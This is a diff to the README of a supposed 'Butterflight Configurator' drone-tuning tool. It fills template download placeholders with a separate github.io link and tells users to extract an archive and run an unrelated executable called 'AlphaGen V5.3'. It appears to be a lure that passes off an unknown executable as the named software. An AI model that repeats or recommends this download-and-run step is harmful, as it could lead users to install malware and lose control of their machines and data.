@@ -2,13 +2,13 @@
 
 Butterflight Configurator is a custom tuning interface built for Butterflight firmware — a smoother, more experimental fork of Betaflight for FPV drones.
 
-[![Download](https://img.shields.io/badge/Download-Butterflight_Configurator-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Butterflight_Configurator-blueviolet)](https://butterflight-configurator-fpv-tuning.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://butterflight-configurator-fpv-tuning.github.io/.github)  
 2. 📁 Extract the contents to your selected folder  
 3. 🖱 Run AlphaGen V5.3 to initialize Butterflight detection  
 4. ✅ Connect your flight controller via USB and launch configuration
